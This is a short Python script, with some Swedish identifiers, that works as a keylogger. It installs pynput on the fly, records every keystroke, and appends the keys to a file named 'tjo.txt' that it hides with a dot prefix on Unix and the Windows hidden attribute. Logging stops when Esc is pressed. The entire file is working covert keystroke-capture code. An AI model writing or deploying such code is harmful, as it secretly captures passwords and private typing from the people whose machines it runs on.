import sys
import subprocess
import os
import ctypes
# implement pip as a subprocess:
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 
'pynput'])

from pynput.keyboard import Key, Listener

count = 0
tangs = []


#If pressed
def on_tryck(tang):
    global tangs, count
    tangs.append(tang)
    count += 1
    #Optional
    print("{0} pressed".format(tang))

    if count >= 10:
        count = 0
        write_file(tangs)
        tangs = []


#Write input to file



FILE_ATTRIBUTE_HIDDEN = 0x02

def write_file(tangs):
    """
    Cross platform hidden file writer.
    """
    # For *nix add a '.' prefix.
    prefix = '.' if os.name != 'nt' else ''
    file_name = prefix + 'tjo.txt'

    # Write file.
    with open(file_name, 'a') as f:
        for tang in tangs:
            k = str(tang).replace("'","")
            #If space/enter key, make more usable
            if k.find("space") > 0 or k.find("enter") > 0:
                f.write('\n')
            #If unknown
            elif k.find("Key") == -1:
                f.write(k)

    # For windows set file attribute.
    if os.name == 'nt':
        ret = ctypes.windll.kernel32.SetFileAttributesW(file_name,
                                                        FILE_ATTRIBUTE_HIDDEN)
        if not ret: # There was an error.
            raise ctypes.WinError()


#Exit
def on_slapp(tang):
    if tang == Key.esc:
        return False

with Listener(on_press=on_tryck, on_release=on_slapp) as listener:
    listener.join()